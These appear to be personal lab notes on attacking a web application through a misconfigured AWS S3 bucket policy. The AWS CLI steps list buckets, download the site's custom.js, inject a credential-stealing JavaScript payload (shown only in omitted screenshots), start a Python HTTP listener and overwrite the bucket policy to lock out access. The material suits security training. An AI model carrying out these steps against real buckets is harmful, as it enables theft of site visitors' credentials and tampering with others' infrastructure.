S3 is commonly used for storing static resources required by web applications. In such cases, the static resource will require public read permission. While providing public read permission to the bucket, the bucket policy has to be crafted very carefully.  

In this lab, we will take a look at how to leverage the misconfigured bucket policy to perform various attacks on the web application.

==================================================================

Configuring AWS CLI --> `aws configure`
Listing s3 buckets --> `aws s3api list-buckets`
![[Pasted image 20210827224403.png]]
Listing objects in first bucket --> `aws s3 ls s3://s3-file-load-174791200647`
![[Pasted image 20210827224612.png]]
CHecking if static website is enabled --> `https://s3-file-load-174791200647.s3-website-us-east-1.amazonaws.com`
![[Pasted image 20210827224807.png]]

Listing objects in the second bucket -->  `aws s3 ls s3://s3-file-load-static-174791200647`
![[Pasted image 20210827225032.png]]
Retrieving bucket policy --> `aws s3api get-bucket-policy --bucket s3-file-load-static-174791200647 --output text | python3 -m json.tool`
![[Pasted image 20210827225245.png]]
Anyone can update the bucket policy and objects

Copying custom.js --> `aws s3 cp s3://s3-file-load-static-174791200647/static/javascript/custom.js ./`
Modifying custom.js 
![[Pasted image 20210827225553.png]]
![[Pasted image 20210827225619.png]]
Upload custom.js modified -->  `aws s3 cp custom.js s3://s3-file-load-static-174791200647/static/javascript/custom.js`

Injecting simple javascript payload to steal credentials
![[Pasted image 20210827225928.png]]

Start python HTTP server --> `python3 -m http.server 65500`

Modifying policy to deny access -->  `aws s3api get-bucket-policy --bucket s3-file-load-static-174791200647 --output text | python3 -m json.tool > policy.json`
![[Pasted image 20210827230525.png]]
Upload policy -->  `aws s3api put-bucket-policy --bucket s3-file-load-static-174791200647 --policy file://policy.json`